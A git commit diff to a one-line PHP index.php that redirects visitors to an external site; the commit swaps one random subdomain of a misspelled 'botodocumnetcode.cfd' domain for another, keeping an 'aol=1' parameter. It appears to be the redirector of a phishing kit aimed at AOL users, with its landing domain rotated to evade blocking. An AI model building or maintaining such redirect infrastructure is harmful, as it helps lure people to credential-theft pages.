8012c4c64b0ce0057133410540137b794ee35d9a
supportwinnerhill <support@winnerhill.com>
2026-09-11 11:34:45 +0000

    Update Nw

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://view-rdjef8eze.botodocumnetcode.cfd/?aol=1/");
+header("Location: https://view-yt45gp9ol.botodocumnetcode.cfd/?aol=1/");
 exit();
 ?>
